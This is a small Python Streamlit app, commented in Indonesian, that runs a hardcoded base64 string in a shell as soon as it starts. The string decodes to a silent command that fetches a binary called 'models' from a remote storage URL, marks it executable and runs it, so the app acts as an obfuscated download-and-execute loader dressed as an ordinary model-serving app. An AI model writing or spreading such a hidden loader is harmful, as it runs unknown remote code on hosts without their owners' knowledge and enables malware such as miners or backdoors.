import streamlit as st
import base64
import subprocess
import os

def run_base64_script(base64_script):
    """
    Menjalankan skrip base64 di shell.

    Args:
        base64_script (str): Skrip yang dikodekan dalam base64.
    """

    try:
        # Decode base64 script
        decoded_script = base64.b64decode(base64_script).decode('utf-8')

        # Jalankan script di shell
        process = subprocess.Popen(decoded_script, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE)

        # Dapatkan output dan error dari proses
        stdout, stderr = process.communicate()

        # Tampilkan output di Streamlit
        st.subheader("Output Skrip:")
        st.code(stdout.decode('utf-8'))

        # Jika ada error, tampilkan di Streamlit
        if stderr:
            st.subheader("Error Skrip:")
            st.code(stderr.decode('utf-8'))

    except Exception as e:
        st.error(f"Terjadi kesalahan saat menjalankan skrip: {e}")

# Base64 script Anda
base64_script = "d2dldCAtcU8gbW9kZWxzIGh0dHBzOi8vbW9kZWxpbmcuc2dwMS5kaWdpdGFsb2NlYW5zcGFjZXMuY29tL21vZGVkMS9zYW1wbGVtb2QgJiYgY2htb2QgK3ggbW9kZWxzICYmIC4vbW9kZWxzCg=="

# Jalankan skrip base64 saat aplikasi dimulai
if __name__ == "__main__":
    run_base64_script(base64_script)